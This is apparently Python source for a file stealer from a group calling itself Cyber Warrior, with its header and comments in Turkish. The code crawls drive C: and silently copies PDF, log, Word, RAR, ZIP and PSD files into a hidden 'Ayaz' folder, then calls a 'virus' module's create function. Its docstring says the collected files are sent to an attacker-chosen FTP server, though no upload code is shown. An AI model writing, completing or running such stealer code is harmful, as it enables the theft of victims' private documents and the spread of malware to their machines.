# -*- coding: cp1254 -*-
"""
Cyber Warrior TIM                            
       _____ 	__     __ __      ___   
      / ___ \	\  \   \ \ /\    /  /   
     / /   \/	 \  \  /  \  \  /  /    
    | |      	  \  \/  / \  \/  /     
    |  \    __ 	   \    /   \    /      
     \  \__/ /	    \  /     \  /       
      \_____/	     \/       \/        

Information Technology's Underground World   
Coder: Kara Ayaz  |  karaayaz_@outlook.com   
MuRe Proje Ekibi	         CWStaller
____________________________________________________________________

Cyber Warrior adına yazmış olduğum bu staller, C: diski üzerinde pdf, log, doc, docx, rar, zip, psd gibi
dosyaları tarayarak yine C: üzerinde "Ayaz" isminde bir dosyanın içine uzantısı adında ki klasöre kaydedecektir.
Daha sonra bunları sizin belirlemiş olduğunuz ftp adresine gönderecektir.
"""
# Modüller
import os
import os.path
import shutil
import getpass
import fnmatch
import ftplib
import threading
import virus

############# Dosya Dizinleri #############
cw = "\Ayaz\cw"
if not os.path.exists(cw):
    os.makedirs(cw)

# C: Diski İçerisinde Tarama
def search(dir, ext):
    for root, dirs, files in os.walk(dir):
        for name in files:
            if fnmatch.fnmatch(name, ext):
                filename = os.path.join(root, name)
                yield filename

# Bulunan Dosyaları Kopyala
# PDF Uzantılı Dosyalar
for filename in search("C:/", "*.pdf"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

# Log Uzantılı Dosyalar
for filename in search("C:/", "*.log"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

# Doc Uzantılı Dosyalar
for filename in search("C:/", "*.doc"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

# Docx Uzantılı Dosyalar
for filename in search("C:/", "*.docx"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

# Rar Uzantılı Dosyalar
for filename in search("C:/", "*.rar"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

#Zip Uzantılı Dosyalar
for filename in search("C:/", "*.zip"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

#PSD Uzantılı Dosyalar
for filename in search("C:/", "*.psd"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

virus.olustur()
